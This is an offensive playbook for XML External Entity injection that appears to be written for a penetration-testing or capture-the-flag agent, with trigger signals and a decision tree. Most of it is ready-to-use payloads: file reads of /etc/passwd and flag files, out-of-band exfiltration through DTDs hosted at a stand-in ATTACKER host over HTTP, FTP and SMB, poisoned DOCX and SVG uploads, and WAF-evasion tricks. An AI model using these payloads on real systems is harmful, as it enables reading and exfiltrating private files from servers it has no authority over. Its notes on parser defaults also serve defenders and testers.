# XML External Entity (XXE) Injection

## Trigger

Load XXE methodology when ANY of these signals appear:
- Endpoint accepts XML content: `Content-Type: application/xml`, `text/xml`, `application/soap+xml`
- File upload accepts SVG, DOCX, XLSX, PPTX, ODT, or any office XML format
- SOAP API endpoints with XML request/response
- RSS/Atom feed ingestion or generation
- JSON endpoints that might accept XML when `Content-Type` is changed (content-type confusion)
- Application converts SVG to PNG/PDF (CairoSVG, svglib, librsvg, ImageMagick)
- Error messages containing XML parser details: `XMLStreamReader`, `SAXParser`, `DocumentBuilder`
- Any `XInclude` processing in document pipelines

## Attack Surface

- XML parsers that do NOT disable DTD processing by default (libxml2, Java SAX/DOM, .NET XmlDocument)
- SVG upload endpoints (image metadata extraction, rendering pipelines)
- Office document upload (DOCX/XLSX/PPTX are ZIP + XML archives)
- SOAP/WSDL web services processing XML requests
- RSS/Atom feed reader, podcast aggregator
- DOCTYPE declarations in HTML5 served as `application/xhtml+xml`
- PDF generation from user-supplied XML/XSL-FO
- XML-RPC endpoints

## Decision Tree

```
1. Probe → Send XML entity and check if entity is expanded
   ├─ In-band (entity value appears in response)
   │     └─ Basic XXE → Direct file read
   └─ No in-band output → Blind XXE
         ├─ OOB with external DTD → Exfiltrate via HTTP/DNS
         └─ Error-based → Entity value in error message

2. If XML parsing is not confirmed → Try Content-Type switching
     POST JSON endpoint with Content-Type: application/xml
     Server might accept both formats

3. If direct XML input isn't available → Use indirect vectors
     SVG upload, DOCX/XLSX upload, SOAP, RSS
```

## Techniques

### Basic XXE (In-Band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
]>
<root>&xxe;</root>
```

### Blind XXE with External DTD (OOB Exfiltration)

**Hosted DTD** (on attacker-controlled server `http://ATTACKER/evil.dtd`):

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
%eval;
%exfil;
```

**Trigger payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://ATTACKER/evil.dtd">
<root>&exfil;</root>
```

### OOB Exfiltration via FTP/SMB/HTTP

```xml
<!ENTITY % exfil SYSTEM "ftp://ATTACKER:2121/%file;">
<!ENTITY % exfil SYSTEM "file://///ATTACKER/share/%file;">
```

### XXE via DOCX/XLSX Upload

DOCX/XLSX/PPTX files are ZIP archives. Inject XXE into the XML files inside:

```bash
# 1. Extract the DOCX
unzip target.docx -d docx_exploit/

# 2. Inject XXE into [Content_Types].xml or word/document.xml
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/xml"/>
  <Override PartName="/leak" ContentType="&xxe;"/>
</Types>
EOF

# 3. Repackage and upload
zip -r exploit.docx '[Content_Types].xml' word/ _rels/
curl -F "file=@exploit.docx" http://target/upload
```

### SVG XXE (Upload-to-Read/SSRF)

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE foo [
  <!ENTITY dat SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200mm" height="50mm">
  <text x="10" y="15" font-size="4" fill="red">&dat;</text>
</svg>
```

**SVG with large width for long file content (CairoSVX/reportlab):**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
  <!ENTITY xx SYSTEM "file:///proc/self/status">
]>
<svg height="300" width="20000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15" fill="red">test &xx; test</text>
</svg>
```

### XInclude (No DTD Required)

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### XXE via RSS/ATOM Feeds

```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel><title>&xxe;</title></channel>
</rss>
```

### Parameter Entity Blind XXE (No External Server)

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>&error;</root>
```

### XXE via SOAP Request

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <login><username>&xxe;</username></login>
  </soap:Body>
</soap:Envelope>
```

## Bypass

### External DTD Blocked

When outbound HTTP is blocked, host the DTD on the same server via file:// or a writable endpoint:

```xml
<!-- Upload DTD content to a writable server resource -->
<!-- Then reference it locally: -->
<!DOCTYPE foo SYSTEM "file:///var/www/uploads/evil.dtd">
```

### WAF Filtering "file", "flag", "etc" Keywords

Host external DTD on attacker server or localhost port — the DTD content is NOT subject to the upload keyword filter:

```xml
<!-- Uploaded XML: clean, passes filter -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://127.0.0.1:9090/evil.dtd">
<book><title>&leak;</title></book>

<!-- Remote DTD (not filtered): -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

### CDATA Wrapper for Binary Files

```xml
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/combine.dtd">
  %dtd;
]>
<root>&all;</root>
```

Where `combine.dtd` contains: `<!ENTITY all "%start;%file;%end;">`

## Verification

- Entity expansion visible in response confirms XXE
- Out-of-band: `<!ENTITY xxe SYSTEM "http://COLLABORATOR/test">` — HTTP hit confirms parser processes external entities
- Differential: Same request with and without entity — different response length suggests expansion
- SVG XXE: Download the rendered PNG and visually inspect for file content text
- DOCX XXE: Error message or response content contains entity value

## Pitfalls

- Java SAX/DOM parsers are NOT vulnerable by default after JDK 8u20 — check if the developer explicitly enabled DTD processing
- `libxml2` disables entity substitution by default (LIBXML_NOENT required) — test with XInclude as fallback
- PHP's `simplexml` and `DOMDocument` have DTD enabled by default but `libxml_disable_entity_loader()` blocks external entities in PHP < 8.0
- .NET `XmlReader` is safe by default; `XmlDocument` with no settings is NOT safe
- SVG renderers (CairoSVG, svglib, librsvg) resolve entities at parse time before rasterizing — the file content becomes pixel text, not metadata
- For large file exfiltration via SVG XXE, increase the `width` attribute to prevent text clipping in the rendered image
- PDF generators using XSL-FO often process XInclude — test `xi:include` when DTD-based XXE fails
